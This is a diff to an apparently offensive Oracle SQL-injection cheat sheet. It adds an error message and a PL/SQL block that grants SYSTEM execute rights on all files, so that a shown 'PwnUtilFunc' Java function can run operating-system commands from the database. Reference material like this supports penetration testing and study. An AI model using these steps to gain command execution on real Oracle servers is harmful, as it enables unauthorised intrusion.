@@ -91,6 +91,30 @@ EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f7220726570
 SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 ```
 
+**ERROR**
+
+```
+java.security.AccessControlException: the Permission (java.io.FilePermission <<ALL FILES>> execute) has not been granted to SYSTEM. The PL/SQL to grant this is dbms_java.grant_permission( 'SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute' )
+```
+
+
+解决没有execute
+
+```
+BEGIN
+  dbms_java.grant_permission
+      ('SYSTEM',
+       'java.io.FilePermission',
+       '<<ALL FILES>>',
+       'execute');
+  dbms_java.grant_permission
+      ('SYSTEM',
+       'java.lang.RuntimePermission',
+       '*',
+       'writeFileDescriptor' );
+END;
+```
+
 ## Thanks to
 
 * [Heavily taken inspired by - NetSpi SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
